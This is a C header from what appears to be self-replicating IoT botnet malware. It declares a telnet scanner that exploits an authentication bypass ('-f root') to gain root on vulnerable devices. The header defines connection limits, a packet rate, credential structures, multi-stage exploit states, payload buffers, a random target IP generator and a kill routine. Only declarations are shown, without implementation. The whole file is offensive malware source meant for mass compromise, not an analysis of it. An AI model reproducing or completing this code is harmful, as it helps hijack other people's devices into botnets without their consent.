#ifdef SELFREP

/* ============================================================================
 * TELNET BYPASS SCANNER - Authentication Bypass (Port 23)
 * ============================================================================
 * Exploit: Telnet authentication bypass via -f root flag
 * Targets: IoT devices with telnet auth bypass vulnerability
 * Method: USER="-f root" telnet -a command
 * Global: All regions with vulnerable IoT devices
 * ============================================================================ */

#pragma once

#include <stdint.h>

#include "includes.h"

#define TELNETBYPASS_SCANNER_MAX_CONNS   256
#define TELNETBYPASS_SCANNER_RAW_PPS     788

#define TELNETBYPASS_SCANNER_RDBUF_SIZE  1080
#define TELNETBYPASS_SCANNER_HACK_DRAIN  64

struct telnetbypass_scanner_auth {
    char *username;
    char *password;
    uint16_t weight;
};

struct telnetbypass_scanner_connection
{
    int fd, last_recv;
    enum
    {
        TELNETBYPASS_SC_CLOSED,
        TELNETBYPASS_SC_CONNECTING,
        TELNETBYPASS_SC_GET_CREDENTIALS,
        TELNETBYPASS_SC_EXPLOIT_STAGE2,
        TELNETBYPASS_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[TELNETBYPASS_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void telnetbypass_scanner_init();
void telnetbypass_kill(void);

static void telnetbypass_setup_connection(struct telnetbypass_scanner_connection *);
static ipv4_t get_random_telnetbypass_ip(void);

#endif
